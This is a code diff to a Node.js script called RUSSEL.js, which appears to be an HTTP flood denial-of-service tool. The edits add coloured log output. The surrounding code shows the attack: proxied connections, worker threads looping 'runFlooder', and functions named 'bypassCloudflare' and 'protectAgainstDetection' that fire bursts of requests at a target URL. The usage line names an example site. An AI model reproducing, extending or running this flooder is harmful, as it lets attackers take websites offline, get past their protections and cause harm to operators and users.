@@ -10,7 +10,8 @@ process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
 if (process.argv.length < 5) {
-    console.log(`Usage: node RUSSEL.js URL TIME REQ_PER_SEC THREADS\nExample: node RUSSEL.js https://olvidatuex.com 1000 20 10`);
+    console.log(`\x1b[33mUsage: node RUSSEL.js URL TIME REQ_PER_SEC THREADS\x1b[0m`);
+    console.log(`\x1b[33mExample: node RUSSEL.js https://olvidatuex.com 1000 20 10\x1b[0m`);
     process.exit();
 }
 
@@ -68,10 +69,12 @@ const args = {
 const parsedTarget = url.parse(args.target);
 
 if (cluster.isMaster) {
+    console.log(`\x1b[32mMaster process started. Spawning ${args.threads} worker threads...\x1b[0m`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
 } else {
+    console.log(`\x1b[32mWorker process ${cluster.worker.id} started.\x1b[0m`);
     for (let i = 0; i < 10; i++) {
         setInterval(runFlooder, 0);
     }
@@ -99,6 +102,7 @@ class NetSocket {
         connection.setNoDelay(true);
 
         connection.on("connect", () => {
+            console.log(`\x1b[36m[INFO] Connecting to proxy ${options.address}\x1b[0m`);
             connection.write(buffer);
         });
 
@@ -107,7 +111,7 @@ class NetSocket {
             const isAlive = response.includes("HTTP/1.1 200");
             if (!isAlive) {
                 connection.destroy();
-                console.error(`Proxy Error: ${response}`);
+                console.error(`\x1b[31m[ERROR] Proxy Error: ${response}\x1b[0m`);
                 return callback(undefined, "error: invalid response from proxy server");
             }
             return callback(connection, undefined);
@@ -115,13 +119,13 @@ class NetSocket {
 
         connection.on("timeout", () => {
             connection.destroy();
-            console.error("Proxy Timeout");
+            console.error(`\x1b[31m[ERROR] Proxy Timeout\x1b[0m`);
             return callback(undefined, "error: timeout exceeded");
         });
 
         connection.on("error", error => {
             connection.destroy();
-            console.error(`Proxy Error: ${error}`);
+            console.error(`\x1b[31m[ERROR] Proxy Error: ${error}\x1b[0m`);
             return callback(undefined, "error: " + error);
         });
     }
@@ -144,7 +148,7 @@ function randomElement(elements) {
 function bypassCloudflare(proxyOptions, callback) {
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
-            console.error(`Proxy Error: ${error}`);
+            console.error(`\x1b[31m[ERROR] Proxy Error: ${error}\x1b[0m`);
             return;
         }
 
@@ -185,12 +189,12 @@ function bypassCloudflare(proxyOptions, callback) {
         client.setMaxListeners(0);
 
         client.on("connect", () => {
-            console.log(`[INFO] Connected to ${parsedTarget.href}`);
+            console.log(`\x1b[36m[INFO] Connected to ${parsedTarget.href}\x1b[0m`);
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
                     headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                     const request = client.request(headers).on("response", response => {
-                        console.log(`[INFO] Response: ${response.statusCode} ${response.statusMessage}`);
+                        console.log(`\x1b[36m[INFO] Response: ${response.statusCode} ${response.statusMessage}\x1b[0m`);
                     });
 
                     request.end();
@@ -199,13 +203,13 @@ function bypassCloudflare(proxyOptions, callback) {
         });
 
         client.on("close", () => {
-            console.log(`[INFO] Connection closed.`);
+            console.log(`\x1b[36m[INFO] Connection closed.\x1b[0m`);
             client.destroy();
             connection.destroy();
         });
 
         client.on("error", error => {
-            console.error(`Connection Error: ${error}`);
+            console.error(`\x1b[31m[ERROR] Connection Error: ${error}\x1b[0m`);
             client.destroy();
             connection.destroy();
         });
@@ -255,11 +259,10 @@ function checkProxies(proxyList) {
 }
 
 function protectAgainstDetection(proxyOptions, callback) {
-    // Implement detection protection logic here
     console.log("Implementing Detection Protection...");
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
-            console.error(`Proxy Error: ${error}`);
+            console.error(`\x1b[31m[ERROR] Proxy Error: ${error}\x1b[0m`);
             return;
         }
 
@@ -300,12 +303,12 @@ function protectAgainstDetection(proxyOptions, callback) {
         client.setMaxListeners(0);
 
         client.on("connect", () => {
-            console.log(`[INFO] Connected to ${parsedTarget.href}`);
+            console.log(`\x1b[36m[INFO] Connected to ${parsedTarget.href}\x1b[0m`);
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
                     headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                     const request = client.request(headers).on("response", response => {
-                        console.log(`[INFO] Response: ${response.statusCode} ${response.statusMessage}`);
+                        console.log(`\x1b[36m[INFO] Response: ${response.statusCode} ${response.statusMessage}\x1b[0m`);
                     });
 
                     request.end();
@@ -314,13 +317,13 @@ function protectAgainstDetection(proxyOptions, callback) {
         });
 
         client.on("close", () => {
-            console.log(`[INFO] Connection closed.`);
+            console.log(`\x1b[36m[INFO] Connection closed.\x1b[0m`);
             client.destroy();
             connection.destroy();
         });
 
         client.on("error", error => {
-            console.error(`Connection Error: ${error}`);
+            console.error(`\x1b[31m[ERROR] Connection Error: ${error}\x1b[0m`);
             client.destroy();
             connection.destroy();
         });
@@ -331,5 +334,5 @@ const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 
-process.on('uncaughtException', error => { console.error(`Uncaught Exception: ${error}`); });
-process.on('unhandledRejection', error => { console.error(`Unhandled Rejection: ${error}`); });
+process.on('uncaughtException', error => { console.error(`\x1b[31m[ERROR] Uncaught Exception: ${error}\x1b[0m`); });
+process.on('unhandledRejection', error => { console.error(`\x1b[31m[ERROR] Unhandled Rejection: ${error}\x1b[0m`); });
